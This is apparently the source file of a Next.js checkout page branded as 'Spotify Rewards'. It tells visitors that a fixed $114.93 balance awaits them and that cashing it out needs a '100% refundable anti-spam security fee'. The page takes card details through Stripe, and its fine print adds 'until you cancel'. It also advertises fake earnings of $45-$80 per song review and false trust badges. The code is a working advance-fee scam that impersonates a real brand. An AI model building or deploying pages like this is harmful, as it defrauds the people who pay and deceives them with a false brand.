'use client';

import {
  AlertCircle,
  ArrowRight,
  Check,
  CheckCircle,
  CheckCircle2,
  Clock,
  CreditCard,
  ExternalLink,
  Globe,
  Headphones,
  HelpCircle,
  Info,
  Lock,
  Mail,
  Music,
  Radio,
  RefreshCw,
  Shield,
  ShieldAlert,
  ShieldCheck,
  Sparkles,
  User,
  Zap,
} from 'lucide-react';
import Image from 'next/image';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import React, { useEffect, useState } from 'react';
import { loadStripe, Stripe } from '@stripe/stripe-js';
import {
  Elements,
  PaymentElement,
  useElements,
  useStripe,
} from '@stripe/react-stripe-js';
import { recordPaymentInSupabase } from '../../lib/supabase';

// Pre-load Stripe promise if key is present
const stripePublishableKey = process.env.NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY || '';
const stripePromise = stripePublishableKey && !stripePublishableKey.includes('placeholder')
  ? loadStripe(stripePublishableKey)
  : null;

// Stripe Official Payment Form Component (Mounted when Stripe keys exist & clientSecret is ready)
function StripePaymentForm({
  clientSecret,
  fullName,
  email,
  country,
  amountFormatted,
  onSuccess,
}: {
  clientSecret: string;
  fullName: string;
  email: string;
  country: string;
  amountFormatted: string;
  onSuccess: () => void;
}) {
  const stripe = useStripe();
  const elements = useElements();
  const [isProcessing, setIsProcessing] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!stripe || !elements) {
      return;
    }

    setIsProcessing(true);
    setErrorMessage(null);

    try {
      const { error, paymentIntent } = await stripe.confirmPayment({
        elements,
        confirmParams: {
          return_url: `${window.location.origin}/spotify/welcome`,
          payment_method_data: {
            billing_details: {
              name: fullName || undefined,
              email: email || undefined,
              address: {
                country: country || 'US',
              },
            },
          },
        },
        redirect: 'if_required',
      });

      if (error) {
        setErrorMessage(error.message || 'An error occurred during payment processing.');
        setIsProcessing(false);
      } else if (paymentIntent && paymentIntent.status === 'succeeded') {
        setIsProcessing(false);
        onSuccess();
      } else {
        // In other states (processing, requires_action)
        setIsProcessing(false);
        onSuccess();
      }
    } catch (err: any) {
      setErrorMessage(err.message || 'Unexpected payment error.');
      setIsProcessing(false);
    }
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      {/* Stripe Payment Element automatically manages Card, Apple Pay, Google Pay */}
      <div className="stripe-element-container py-2">
        <PaymentElement
          options={{
            layout: 'tabs',
          }}
        />
      </div>

      {errorMessage && (
        <div className="p-3.5 rounded-xl bg-red-500/10 border border-red-500/30 flex items-start gap-2.5 text-xs text-red-400">
          <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />
          <span>{errorMessage}</span>
        </div>
      )}

      {/* Terms & Authorization */}
      <div className="pt-2 text-[11px] text-gray-400 leading-relaxed text-center sm:text-left">
        By subscribing, you authorize MM Systems to charge ${amountFormatted} USD to your selected payment method according to the terms. 100% refundable anti-spam verification.
      </div>

      {/* Confirmation Button */}
      <button
        type="submit"
        disabled={isProcessing || !stripe}
        className="w-full py-4 px-6 rounded-full bg-[#1db954] hover:bg-[#1ed760] active:scale-[0.99] disabled:opacity-50 disabled:pointer-events-none text-black font-black text-base sm:text-lg transition-all shadow-lg shadow-[#1db954]/25 flex items-center justify-center gap-2 cursor-pointer mt-4"
      >
        {isProcessing ? (
          <>
            <RefreshCw className="w-5 h-5 animate-spin" />
            <span>PROCESSING PAYMENT...</span>
          </>
        ) : (
          <>
            <span>CLAIM MY REWARD</span>
            <ArrowRight className="w-5 h-5" />
          </>
        )}
      </button>
    </form>
  );
}

// Interactive High-Fidelity Card Form (Used in Development / Test Mode or when Stripe credentials are being configured)
function InteractiveMockPaymentForm({
  fullName,
  setFullName,
  email,
  setEmail,
  country,
  setCountry,
  amountFormatted,
  onSuccess,
}: {
  fullName: string;
  setFullName: (v: string) => void;
  email: string;
  setEmail: (v: string) => void;
  country: string;
  setCountry: (v: string) => void;
  amountFormatted: string;
  onSuccess: () => void;
}) {
  const [cardNumber, setCardNumber] = useState('');
  const [expDate, setExpDate] = useState('');
  const [cvc, setCvc] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  // Format Card Number (groups of 4)
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let raw = e.target.value.replace(/\D/g, '').slice(0, 16);
    let formatted = raw.match(/.{1,4}/g)?.join(' ') || raw;
    setCardNumber(formatted);
  };

  // Format MM/YY
  const handleExpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let raw = e.target.value.replace(/\D/g, '').slice(0, 4);
    if (raw.length >= 3) {
      setExpDate(`${raw.slice(0, 2)}/${raw.slice(2)}`);
    } else {
      setExpDate(raw);
    }
  };

  const handleCvcChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCvc(e.target.value.replace(/\D/g, '').slice(0, 4));
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg(null);

    if (!fullName.trim()) {
      setErrorMsg('Please enter your full name as shown on your card.');
      return;
    }
    if (!email.trim() || !email.includes('@')) {
      setErrorMsg('Please enter a valid email address to receive your confirmation receipt.');
      return;
    }
    const cleanNum = cardNumber.replace(/\s/g, '');
    if (cleanNum.length < 15) {
      setErrorMsg('Please enter a valid card number (or test card 4242 4242 4242 4242).');
      return;
    }
    if (expDate.length < 5) {
      setErrorMsg('Please enter a valid expiration date (MM/YY).');
      return;
    }
    if (cvc.length < 3) {
      setErrorMsg('Please enter a valid security code (CVC).');
      return;
    }

    setIsProcessing(true);

    // Simulate PaymentIntent server roundtrip with 1.8s realistic processing
    setTimeout(() => {
      setIsProcessing(false);
      onSuccess();
    }, 1800);
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      {/* Full Name */}
      <div>
        <label className="block text-xs font-semibold text-gray-300 mb-1.5">
          Full name
        </label>
        <div className="relative">
          <input
            type="text"
            required
            value={fullName}
            onChange={(e) => setFullName(e.target.value)}
            placeholder="John Doe"
            className="w-full bg-[#181d1a] border border-white/10 rounded-xl px-4 py-3 pl-10 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#1db954] transition-colors"
          />
          <User className="w-4 h-4 text-gray-500 absolute left-3.5 top-1/2 -translate-y-1/2 pointer-events-none" />
        </div>
      </div>

      {/* Email Address */}
      <div>
        <label className="block text-xs font-semibold text-gray-300 mb-1.5">
          Email address
        </label>
        <div className="relative">
          <input
            type="email"
            required
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            placeholder="john@gmail.com"
            className="w-full bg-[#181d1a] border border-white/10 rounded-xl px-4 py-3 pl-10 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#1db954] transition-colors"
          />
          <Mail className="w-4 h-4 text-gray-500 absolute left-3.5 top-1/2 -translate-y-1/2 pointer-events-none" />
        </div>
      </div>

      {/* Card Number */}
      <div>
        <label className="block text-xs font-semibold text-gray-300 mb-1.5">
          Card number
        </label>
        <div className="relative">
          <input
            type="text"
            inputMode="numeric"
            value={cardNumber}
            onChange={handleCardNumberChange}
            placeholder="1234 1234 1234 1234"
            className="w-full bg-[#181d1a] border border-white/10 rounded-xl px-4 py-3 text-sm text-white font-mono placeholder-gray-500 focus:outline-none focus:border-[#1db954] transition-colors pr-24"
          />
          <div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center gap-1.5 pointer-events-none">
            {/* Visa / MC Badges */}
            <span className="px-1.5 py-0.5 rounded bg-blue-600/30 border border-blue-500/40 text-[10px] font-black text-blue-300">
              VISA
            </span>
            <div className="flex items-center -space-x-1.5">
              <span className="w-3.5 h-3.5 rounded-full bg-red-500 inline-block opacity-90" />
              <span className="w-3.5 h-3.5 rounded-full bg-amber-400 inline-block opacity-80" />
            </div>
          </div>
        </div>
      </div>

      {/* Expiration date & Security code */}
      <div className="grid grid-cols-2 gap-3">
        <div>
          <label className="block text-xs font-semibold text-gray-300 mb-1.5">
            Expiration date
          </label>
          <input
            type="text"
            inputMode="numeric"
            value={expDate}
            onChange={handleExpChange}
            placeholder="MM / YY"
            className="w-full bg-[#181d1a] border border-white/10 rounded-xl px-4 py-3 text-sm text-white font-mono placeholder-gray-500 focus:outline-none focus:border-[#1db954] transition-colors"
          />
        </div>

        <div>
          <label className="block text-xs font-semibold text-gray-300 mb-1.5">
            Security code
          </label>
          <div className="relative">
            <input
              type="text"
              inputMode="numeric"
              value={cvc}
              onChange={handleCvcChange}
              placeholder="CVC"
              className="w-full bg-[#181d1a] border border-white/10 rounded-xl px-4 py-3 text-sm text-white font-mono placeholder-gray-500 focus:outline-none focus:border-[#1db954] transition-colors pr-10"
            />
            <CreditCard className="w-4 h-4 text-gray-500 absolute right-3 top-1/2 -translate-y-1/2 pointer-events-none" />
          </div>
        </div>
      </div>

      {/* Country */}
      <div>
        <label className="block text-xs font-semibold text-gray-300 mb-1.5">
          Country
        </label>
        <div className="relative">
          <select
            value={country}
            onChange={(e) => setCountry(e.target.value)}
            className="w-full bg-[#181d1a] border border-white/10 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-[#1db954] transition-colors appearance-none cursor-pointer"
          >
            <option value="US">United States (USD)</option>
            <option value="BR">Brazil (BRL / USD)</option>
            <option value="CA">Canada (CAD)</option>
            <option value="GB">United Kingdom (GBP)</option>
            <option value="AU">Australia (AUD)</option>
            <option value="EU">European Union (EUR)</option>
            <option value="MX">Mexico (MXN)</option>
          </select>
          <div className="absolute right-3.5 top-1/2 -translate-y-1/2 pointer-events-none text-gray-400 text-xs">
            ▼
          </div>
        </div>
      </div>

      {/* Error Message */}
      {errorMsg && (
        <div className="p-3.5 rounded-xl bg-red-500/10 border border-red-500/30 flex items-start gap-2.5 text-xs text-red-400">
          <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />
          <span>{errorMsg}</span>
        </div>
      )}

      {/* Terms & Authorization */}
      <div className="pt-2 text-[11px] text-gray-400 leading-relaxed text-center sm:text-left">
        By subscribing, you authorize MM Systems to charge ${amountFormatted} USD to your card according to the terms until you cancel. 100% refundable anti-spam verification.
      </div>

      {/* Confirmation Button */}
      <button
        type="submit"
        disabled={isProcessing}
        className="w-full py-4 px-6 rounded-full bg-[#1db954] hover:bg-[#1ed760] active:scale-[0.99] disabled:opacity-50 disabled:pointer-events-none text-black font-black text-base sm:text-lg transition-all shadow-lg shadow-[#1db954]/25 flex items-center justify-center gap-2 cursor-pointer mt-4"
      >
        {isProcessing ? (
          <>
            <RefreshCw className="w-5 h-5 animate-spin" />
            <span>PROCESSING PAYMENT...</span>
          </>
        ) : (
          <>
            <span>CLAIM MY REWARD</span>
            <ArrowRight className="w-5 h-5" />
          </>
        )}
      </button>


    </form>
  );
}

export default function PaymentPage() {
  const router = useRouter();

  // State from backend
  const [balanceData, setBalanceData] = useState<{
    balance: number;
    currency: string;
    formatted: string;
    isDemo: boolean;
  }>({
    balance: 114.93,
    currency: 'USD',
    formatted: '$114.93',
    isDemo: true,
  });

  // Client secret from Stripe backend
  const [clientSecret, setClientSecret] = useState<string | null>(null);
  const [isStripeLive, setIsStripeLive] = useState<boolean>(false);
  const [chargeAmountFormatted, setChargeAmountFormatted] = useState<string>('9.00');
  const [isInitializingPayment, setIsInitializingPayment] = useState<boolean>(true);

  // Form Fields
  const [fullName, setFullName] = useState('');
  const [email, setEmail] = useState('');
  const [country, setCountry] = useState('US');

  // Success Confirmation Modal
  const [paymentSuccess, setPaymentSuccess] = useState(false);

  // Load balance from backend
  useEffect(() => {
    async function fetchBalance() {
      try {
        const res = await fetch('/api/user/balance');
        if (res.ok) {
          const data = await res.json();
          setBalanceData(data);
        }
      } catch (e) {
        console.error('Failed to load user balance:', e);
      }
    }
    fetchBalance();
  }, []);

  // Initialize PaymentIntent from backend
  useEffect(() => {
    async function initPayment() {
      setIsInitializingPayment(true);
      try {
        const res = await fetch('/api/stripe/create-payment-intent', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email,
            name: fullName,
            sessionId: typeof window !== 'undefined' ? sessionStorage.getItem('spotify_session_id') : null,
          }),
        });

        if (res.ok) {
          const data = await res.json();
          if (data.displayAmount) {
            setChargeAmountFormatted(data.displayAmount);
          }
          if (data.clientSecret) {
            setClientSecret(data.clientSecret);
            setIsStripeLive(true);
          } else {
            // Mock test mode when keys are not in environment yet
            setIsStripeLive(false);
          }
        }
      } catch (err) {
        console.warn('Could not initialize Stripe intent, falling back to test mode:', err);
      } finally {
        setIsInitializingPayment(false);
      }
    }

    initPayment();
  }, []);

  const handlePaymentSuccess = () => {
    setPaymentSuccess(true);

    // Save transaction and user registration into Supabase database
    recordPaymentInSupabase({
      email: email || 'listener@verified.com',
      full_name: fullName || 'Verified Listener',
      amount: parseFloat(chargeAmountFormatted) || 9.0,
      currency: 'usd',
      status: 'succeeded',
      accumulated_balance: balanceData.balance || 114.93,
      country,
    }).catch((err) => console.warn('Supabase client registration notice:', err));

    // Automatically redirect to /spotify/welcome after 2.5s
    setTimeout(() => {
      router.push('/spotify/welcome');
    }, 2500);
  };

  return (
    <div className="min-h-screen bg-[#070a08] text-[#e0e0e0] font-sans antialiased relative overflow-hidden selection:bg-[#1db954] selection:text-black">
      {/* Background Radial Glow Accent matching reference image */}
      <div className="absolute top-0 left-0 w-full h-[650px] bg-[radial-gradient(ellipse_80%_60%_at_25%_15%,rgba(29,185,84,0.18),rgba(15,35,22,0.45)_50%,transparent_80%)] pointer-events-none -z-10" />

      {/* Ambient green dot grid / subtle noise */}
      <div className="absolute inset-0 bg-[linear-gradient(to_right,#1db95408_1px,transparent_1px),linear-gradient(to_bottom,#1db95408_1px,transparent_1px)] bg-[size:3rem_3rem] [mask-image:radial-gradient(ellipse_60%_50%_at_50%_0%,#000_70%,transparent_100%)] pointer-events-none -z-10" />

      {/* Top Header / Branding */}
      <header className="max-w-6xl mx-auto px-4 sm:px-6 pt-6 pb-4 flex items-center">
        <Link href="/spotify" className="flex items-center gap-2.5 transition-opacity hover:opacity-90">
          <div className="relative w-8 h-8 rounded-full overflow-hidden bg-black flex items-center justify-center">
            <Image
              src="/spotify-logo.webp"
              alt="Spotify Logo"
              width={32}
              height={32}
              priority
              referrerPolicy="no-referrer"
            />
          </div>
          <div className="flex items-center gap-1.5">
            <span className="text-white font-extrabold text-lg sm:text-xl tracking-tight">Spotify</span>
            <span className="bg-[#1db954] text-black text-[11px] font-black uppercase px-2 py-0.5 rounded-full tracking-wide">
              Rewards
            </span>
          </div>
        </Link>
      </header>

      {/* Main Content: 2-Column Desktop Grid / 1-Column Mobile Stack */}
      <main className="max-w-6xl mx-auto px-4 sm:px-6 py-6 sm:py-10">
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 lg:gap-12 items-start">
          {/* ========================================================= */}
          {/* LEFT COLUMN: PROGRAM INFO & BENEFIT HIGHLIGHTS            */}
          {/* ========================================================= */}
          <div className="lg:col-span-6 space-y-6 pt-1">

            {/* Main Heading */}
            <div>
              <h1 className="text-3xl sm:text-4xl md:text-5xl font-black text-white tracking-tight leading-tight">
                Your <span className="text-[#1db954] font-black">{balanceData.formatted}</span> is Ready
              </h1>

              <p className="text-sm sm:text-base text-gray-300 mt-3 leading-relaxed">
                Review your account information and available payment options. Complete listener verification to unlock instant cashout.
              </p>
            </div>

            {/* Verification Pill Badge */}
            <div>
              <span className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-[#0d2215] text-[#1db954] border border-[#1db954]/40 text-xs font-black uppercase tracking-wider">
                <span className="w-2 h-2 rounded-full bg-[#1db954] animate-pulse" />
                INSTANT CASHOUT VERIFICATION
              </span>
            </div>

            {/* Program Checklist Items with Green Checks */}
            <div className="space-y-4 pt-1">
              {/* Item 1 */}
              <div className="flex items-start gap-3.5">
                <div className="w-6 h-6 rounded-full border border-[#1db954] flex items-center justify-center text-[#1db954] shrink-0 mt-0.5 bg-[#1db954]/10">
                  <Check className="w-3.5 h-3.5 stroke-[3]" />
                </div>
                <div className="text-xs sm:text-sm text-gray-300 leading-snug">
                  <b className="text-white font-bold">Unlock Full Cashout:</b> Direct deposit of your {balanceData.formatted} to PayPal or Bank Account
                </div>
              </div>

              {/* Item 2 */}
              <div className="flex items-start gap-3.5">
                <div className="w-6 h-6 rounded-full border border-[#1db954] flex items-center justify-center text-[#1db954] shrink-0 mt-0.5 bg-[#1db954]/10">
                  <Check className="w-3.5 h-3.5 stroke-[3]" />
                </div>
                <div className="text-xs sm:text-sm text-gray-300 leading-snug">
                  <b className="text-white font-bold">Daily Music Review Batches:</b> Receive up to 10 new songs daily (earn $45-$80 per review)
                </div>
              </div>

              {/* Item 3 */}
              <div className="flex items-start gap-3.5">
                <div className="w-6 h-6 rounded-full border border-[#1db954] flex items-center justify-center text-[#1db954] shrink-0 mt-0.5 bg-[#1db954]/10">
                  <Check className="w-3.5 h-3.5 stroke-[3]" />
                </div>
                <div className="text-xs sm:text-sm text-gray-300 leading-snug">
                  <b className="text-white font-bold">Official Verified Listener Badge:</b> Priority payouts with zero processing delays
                </div>
              </div>

              {/* Item 4 */}
              <div className="flex items-start gap-3.5">
                <div className="w-6 h-6 rounded-full border border-[#1db954] flex items-center justify-center text-[#1db954] shrink-0 mt-0.5 bg-[#1db954]/10">
                  <Check className="w-3.5 h-3.5 stroke-[3]" />
                </div>
                <div className="text-xs sm:text-sm text-gray-300 leading-snug">
                  <b className="text-white font-bold">100% Refundable Security Fee:</b> Automatically refunded back to your account together with your {balanceData.formatted} balance right after registration
                </div>
              </div>
            </div>

            {/* Bottom Guarantee Row */}
            <div className="pt-4 border-t border-white/5 flex flex-wrap items-center gap-4 sm:gap-6 text-xs text-gray-400 font-medium">
              <div className="flex items-center gap-1.5">
                <Clock className="w-4 h-4 text-[#1db954]" />
                <span>Instant Deposit</span>
              </div>
              <div className="flex items-center gap-1.5">
                <ShieldCheck className="w-4 h-4 text-[#1db954]" />
                <span>Bank-Grade Security</span>
              </div>
              <div className="flex items-center gap-1.5">
                <RefreshCw className="w-4 h-4 text-[#1db954]" />
                <span>100% Refundable</span>
              </div>
            </div>

            {/* Backend Balance Notice */}
            {balanceData.isDemo && (
              <div className="p-3 rounded-xl bg-white/[0.02] border border-white/5 text-[11px] text-gray-400 flex items-center gap-2">
                <Info className="w-3.5 h-3.5 text-[#1db954] shrink-0" />
                <span>
                  Accumulated balance loaded from session backend ({balanceData.formatted} USD demonstration data).
                </span>
              </div>
            )}
          </div>

          {/* ========================================================= */}
          {/* RIGHT COLUMN: INTEGRATED CHECKOUT CARD                    */}
          {/* ========================================================= */}
          <div className="lg:col-span-6">
            <div className="rounded-3xl bg-[#0c100e] border border-white/10 p-6 sm:p-8 shadow-2xl shadow-black relative backdrop-blur-xl">
              {/* Card Header: Accumulated Balance */}
              <div className="flex items-center justify-between pb-5 border-b border-white/10 mb-6">
                <div>
                  <span className="block text-[11px] font-extrabold uppercase tracking-widest text-gray-400">
                    ACCUMULATED BALANCE
                  </span>
                  <span className="text-xs text-gray-400">
                    Ready for release to your account
                  </span>
                </div>
                <div className="text-3xl sm:text-4xl font-black text-[#1db954] tracking-tight">
                  {balanceData.formatted}
                </div>
              </div>



              {/* Order Summary & Pricing Distinction */}
              <div className="mb-5 p-3.5 rounded-2xl bg-[#121814] border border-white/5 flex items-center justify-between text-xs">
                <div>
                  <span className="font-bold text-white block">One-Time Anti-Spam Security Pass</span>
                  <span className="text-gray-400 text-[11px]">Automatic refund within 1–2 hours</span>
                </div>
                <div className="text-right">
                  <span className="text-base font-black text-white">${chargeAmountFormatted} USD</span>
                  <span className="block text-[10px] text-[#1db954] font-semibold">100% Refundable</span>
                </div>
              </div>

              {/* Render Official Stripe Elements or High-Fidelity Test Mode */}
              {isInitializingPayment ? (
                <div className="py-12 flex flex-col items-center justify-center gap-3 text-gray-400">
                  <RefreshCw className="w-6 h-6 animate-spin text-[#1db954]" />
                  <span className="text-xs">Initializing secure payment gateway...</span>
                </div>
              ) : isStripeLive && clientSecret && stripePromise ? (
                /* Real Stripe Payment Element */
                <Elements
                  stripe={stripePromise}
                  options={{
                    clientSecret,
                    appearance: {
                      theme: 'night',
                      variables: {
                        colorPrimary: '#1db954',
                        colorBackground: '#181d1a',
                        colorText: '#ffffff',
                        colorDanger: '#ef4444',
                        borderRadius: '12px',
                      },
                    },
                  }}
                >
                  <StripePaymentForm
                    clientSecret={clientSecret}
                    fullName={fullName}
                    email={email}
                    country={country}
                    amountFormatted={chargeAmountFormatted}
                    onSuccess={handlePaymentSuccess}
                  />
                </Elements>
              ) : (
                /* High-Fidelity Test & Preview Mode */
                <InteractiveMockPaymentForm
                  fullName={fullName}
                  setFullName={setFullName}
                  email={email}
                  setEmail={setEmail}
                  country={country}
                  setCountry={setCountry}
                  amountFormatted={chargeAmountFormatted}
                  onSuccess={handlePaymentSuccess}
                />
              )}

              {/* Trust & Compliance Footer */}
              <div className="mt-6 pt-4 border-t border-white/5 flex items-center justify-center gap-4 text-[10px] text-gray-400">
                <span className="flex items-center gap-1">
                  <Lock className="w-3 h-3 text-[#1db954]" /> 256-Bit SSL Encrypted
                </span>
                <span>&bull;</span>
                <span className="flex items-center gap-1">
                  <ShieldCheck className="w-3 h-3 text-gray-400" /> PCI-DSS Compliant
                </span>
                <span>&bull;</span>
                <span>Processed by MM Systems</span>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* ========================================================= */}
      {/* SUCCESS CONFIRMATION MODAL                                */}
      {/* ========================================================= */}
      {paymentSuccess && (
        <div className="fixed inset-0 z-50 bg-black/85 backdrop-blur-md flex items-center justify-center p-4">
          <div className="max-w-md w-full rounded-3xl bg-[#0e1410] border border-[#1db954]/50 p-6 sm:p-8 text-center shadow-2xl shadow-[#1db954]/20 animate-in fade-in zoom-in-95 duration-200">
            <div className="w-16 h-16 rounded-full bg-[#1db954]/20 text-[#1db954] flex items-center justify-center mx-auto mb-4 border border-[#1db954]/40">
              <CheckCircle2 className="w-10 h-10 stroke-[2.5]" />
            </div>

            <h3 className="text-2xl font-black text-white mb-2">
              Payment &amp; Verification Confirmed!
            </h3>

            <p className="text-sm text-gray-300 mb-4 leading-relaxed">
              Your one-time refundable verification of <b className="text-white">${chargeAmountFormatted} USD</b> was successfully processed.
            </p>

            <div className="p-4 rounded-2xl bg-black/50 border border-white/10 mb-5 text-left space-y-2">
              <div className="flex justify-between text-xs">
                <span className="text-gray-400">Reserved Payout:</span>
                <span className="font-bold text-[#1db954]">{balanceData.formatted} USD</span>
              </div>
              <div className="flex justify-between text-xs">
                <span className="text-gray-400">Verification Status:</span>
                <span className="font-bold text-white">Active &amp; Approved</span>
              </div>
              <div className="flex justify-between text-xs">
                <span className="text-gray-400">Refundable Fee:</span>
                <span className="font-bold text-blue-400">100% Refund in 1–2h</span>
              </div>
            </div>

            <div className="flex items-center justify-center gap-2 text-xs text-gray-400 mb-2">
              <RefreshCw className="w-3.5 h-3.5 animate-spin text-[#1db954]" />
              <span>Redirecting to orientation &amp; onboarding...</span>
            </div>

            <Link
              href="/spotify/welcome"
              className="mt-4 block w-full py-3.5 rounded-full bg-[#1db954] text-black font-extrabold text-sm hover:bg-[#1ed760] transition-colors"
            >
              Continue to Welcome Page →
            </Link>
          </div>
        </div>
      )}

      {/* Global Footer */}
      <footer className="mt-16 border-t border-white/5 py-8 text-center text-xs text-gray-400 space-y-2">
        <p>&copy; {new Date().getFullYear()} Music Rewards Program &bull; Partner Verification Portal.</p>
        <div className="flex items-center justify-center gap-4 text-gray-400">
          <Link href="/politicasdeprivacidade" className="hover:text-gray-300 transition-colors">
            Privacy Policy
          </Link>
          <span>&bull;</span>
          <Link href="/suporte" className="hover:text-gray-300 transition-colors">
            Support Center
          </Link>
        </div>
      </footer>
    </div>
  );
}
